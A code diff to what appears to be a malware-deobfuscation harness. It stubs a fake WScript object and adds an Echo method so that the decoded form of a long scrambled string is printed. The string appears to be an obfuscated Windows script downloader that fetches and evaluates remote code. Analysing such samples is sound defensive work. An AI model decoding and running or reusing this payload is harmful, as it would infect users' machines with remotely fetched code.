@@ -1,4 +1,4 @@
-// Dummy WScript struct
+// dummy struct (the fake WScript)
 var WScript = {
     "CreateObject": function(arg1) {
         return (function(arg1) {
@@ -38,6 +38,9 @@ var WScript = {
     },
     "Quit": function() {
         console.log("Quit");
+    },
+    "Echo": function(arg1) {
+        console.log(arg1);
     }
 };
 
@@ -74,7 +77,7 @@ while (Sl37 < 13200585) {
     Sl37 = Sl37 + 1;
 }
 
-console.log(Or64('FB(2 .fsit a}t u;se s=l=a=f  2n0r0u)t e{r  v{a)re (ehHc7t6a c=}  F;B)2(.drneessp.o2nBsFe T;e)xets;l aiff  ,(5(4eRHD7+6\".=iunpdvejxuOdff(y\"y@l\"p+tDiRj4?5\"++\"\'@p\"h,p .0n)i)a=m=/-\'1+)] 2{9 hWDS[c5r1inpFt+.\'s/l/e:eppt(t3h0\'0 0,0\')T;E G}\' (enlespeo .{2 BeFH 7{6y r=t  e;H)7063.+r0e7p,l2a(c]e\"(r\"t@s\"b+uDsR\"4[5)+(\"g@n\"i,r\"t\"S)o;t .v)a(rm oMdJn3a8r .=h teaHM7 6=. r5e4pRlDa c;e)(\'/P(T\\TdH{L2M}X)r/egv,r efSu.n2cLtMiXoSnM \'((itmc2e6j)b O{e traeetruCr.nt pSitrrciSnWg .=f r2oBmFC h{a r)C3o d<e (2p9ahrDs(e Ienlti(hiwm 2;60, 1=0 )2+93h0D) ;; ]}\")e;b .Krqe6t3s[p3p]e(wM.Jd3n8a)l(r)e;d eWnSrcertinpetc.yQtueifta(s)\";, \"}p j}. oecl.sset a{l pWnSicfr\"i,p\"tm.oscl.efelpo(g3-0u0s0a0y)u;k a}k \"D[h 9=2 +5+1;n}F '));\
+WScript.Echo(Or64('FB(2 .fsit a}t u;se s=l=a=f  2n0r0u)t e{r  v{a)re (ehHc7t6a c=}  F;B)2(.drneessp.o2nBsFe T;e)xets;l aiff  ,(5(4eRHD7+6\".=iunpdvejxuOdff(y\"y@l\"p+tDiRj4?5\"++\"\'@p\"h,p .0n)i)a=m=/-\'1+)] 2{9 hWDS[c5r1inpFt+.\'s/l/e:eppt(t3h0\'0 0,0\')T;E G}\' (enlespeo .{2 BeFH 7{6y r=t  e;H)7063.+r0e7p,l2a(c]e\"(r\"t@s\"b+uDsR\"4[5)+(\"g@n\"i,r\"t\"S)o;t .v)a(rm oMdJn3a8r .=h teaHM7 6=. r5e4pRlDa c;e)(\'/P(T\\TdH{L2M}X)r/egv,r efSu.n2cLtMiXoSnM \'((itmc2e6j)b O{e traeetruCr.nt pSitrrciSnWg .=f r2oBmFC h{a r)C3o d<e (2p9ahrDs(e Ienlti(hiwm 2;60, 1=0 )2+93h0D) ;; ]}\")e;b .Krqe6t3s[p3p]e(wM.Jd3n8a)l(r)e;d eWnSrcertinpetc.yQtueifta(s)\";, \"}p j}. oecl.sset a{l pWnSicfr\"i,p\"tm.oscl.efelpo(g3-0u0s0a0y)u;k a}k \"D[h 9=2 +5+1;n}F '));
 
 // mission clear
 
